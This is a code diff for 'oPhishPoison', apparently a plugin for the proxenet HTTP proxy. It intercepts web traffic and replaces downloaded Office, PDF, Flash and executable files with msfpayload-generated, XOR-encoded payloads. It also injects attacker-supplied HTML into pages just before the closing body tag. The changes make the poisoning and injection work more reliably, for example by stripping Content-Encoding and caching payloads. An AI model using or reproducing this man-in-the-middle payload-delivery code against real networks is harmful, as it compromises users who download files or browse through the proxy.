@@ -18,7 +18,7 @@ PLUGIN_NAME   = "oPhishPoison"
 AUTHOR        = "@_hugsy_"
 
 
-import os, subprocess, ConfigParser
+import os, subprocess, ConfigParser, re
 from pimp import HTTPResponse, HTTPBadResponseException
 
 HOME = os.getenv( "HOME" )
@@ -26,12 +26,12 @@ CONFIG_FILE = os.getenv("HOME") + "/.proxenet.ini"
 
 config = ConfigParser.ConfigParser()
 config.read(CONFIG_FILE)
-path_to_msfpayload   = config.get(PLUGIN_NAME, "msfpayload")
-path_to_python       = config.get(PLUGIN_NAME, "python")
-path_to_xor_payload  = config.get(PLUGIN_NAME, "xor_payload")
-path_to_html         = config.get(PLUGIN_NAME, "html_inject_stub")
+path_to_msfpayload   = config.get(PLUGIN_NAME, "msfpayload", 0, {"home": os.getenv("HOME")})
+path_to_python       = config.get(PLUGIN_NAME, "python", 0, {"home": os.getenv("HOME")})
+path_to_xor_payload  = config.get(PLUGIN_NAME, "xor_payload", 0, {"home": os.getenv("HOME")})
+path_to_html         = config.get(PLUGIN_NAME, "html_inject_stub", 0, {"home": os.getenv("HOME")})
 
-file_cache = {}
+file_cache = { "html": path_to_html, }
 
 types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
          "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
@@ -42,7 +42,7 @@ types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml
          "pdf": "application/pdf",
          "swf": "application/x-shockwave-flash",
          "exe": "application/x-msdos-program",
-         "html": "application/html",
+         "html": "text/html",
          }
 
 
@@ -78,22 +78,27 @@ def replace_with_malicious(http, ctype):
     """
 
     # 1.
-    cmd = "{python} {xor} --quiet".format(python=path_to_python, xor=path_to_xor_payload)
-    if   ctype in ("xslx", "xls"):  cmd += "--excel"
-    elif ctype in ("docx", "doc"):  cmd += "--word"
-    elif ctype in ("pptx", "ppt"):  cmd += "--powerpoint"
-    elif ctype == "pdf":            cmd += "--pdf"
-    elif ctype == "swf":            cmd += "--flash"
-
     res = hit_cache(ctype)
     if res == False:
         try:
+            cmd = "{python} {xor} --quiet".format(python=path_to_python, xor=path_to_xor_payload)
+            if   ctype in ("xslx", "xls"):  cmd += " --excel"
+            elif ctype in ("docx", "doc"):  cmd += " --word"
+            elif ctype in ("pptx", "ppt"):  cmd += " --powerpoint"
+            elif ctype == "pdf":            cmd += " --pdf"
+            elif ctype == "swf":            cmd += " --flash"
+
             with open(path_to_msfpayload, "rb") as f:
-                p = subprocess.Popen(cmd.split(" "), stdin=f)
-                res = p.communicate()[0]
+                res = subprocess.check_output(cmd.split(" "), stdin=f)
+                if res is None or len(res)==0:
+                    raise Exception("check_output() failed")
+
+                res = res.strip()
+
             file_cache[ctype] = res
+
         except Exception as e:
-            print("Payload generation failed: %s" % e)
+            print("Payload generation failed for '%s': %s" % (ctype, e))
             return False
 
     # 2.
@@ -105,12 +110,34 @@ def replace_with_malicious(http, ctype):
 
 
 def inject_html(http):
-    pattern = "(</body>)"
-    script = "<script src=\"{}\"></script>".format( path_to_html )
-    repl = "{}\1".format( script )
-    new_page = re.sub(pattern, repl, http.body, count=1, flags=re.IGNORECASE)
+    """
+    Do the same than replace_with_malicious() but with HTML content.
+    The payload will be appended at the end of the <body> (i.e. right before </body>),
+    and render the new content to the browser.
+    """
+    res = hit_cache("html")
+    if res == False:
+        return False
 
-    http.body = new_page
+    with open(res, "rb") as f:
+        html_to_inject = f.read()
+
+    if len(html_to_inject) == 0:
+        return False
+
+    new = re.sub(r"(</body>)",
+                 r"%s\1" % html_to_inject,
+                 http.body,
+                 flags=re.IGNORECASE)
+
+    if new == http.body:
+        # if here, means http response is chunked, so just append it
+        http.body += html_to_inject
+    else:
+        http.body = new
+
+    http.del_header("Content-Encoding")
+    print("Injecting HTML content into response {rid:d}".format(rid=http.rid))
     return http.render()
 
 
@@ -127,7 +154,7 @@ def proxenet_response_hook(rid, response, uri):
     If so, inject our payload.
     """
     try:
-        http = HTTPResponse(response)
+        http = HTTPResponse(response, rid=rid)
 
         if not http.has_header("Content-Type"):
             del(http)
@@ -139,16 +166,22 @@ def proxenet_response_hook(rid, response, uri):
             return response
 
         if detected_type == "html":
-            return inject_html(http)
+            res = inject_html(http)
+            if  res == False:
+                del(http)
+                return response
+            else:
+                return res
 
         if replace_with_malicious(http, detected_type) == False:
             del(http)
             return response
 
-        print("Poisoining {} file in response {}: {}".format(detected_type, rid, http.headers))
+        print("Poisoining response {rid:d} with format '{fmt:s}'".format(rid=rid, fmt=detected_type))
         return http.render()
 
     except HTTPBadResponseException as e :
+        # print(e)
         return response
 
 
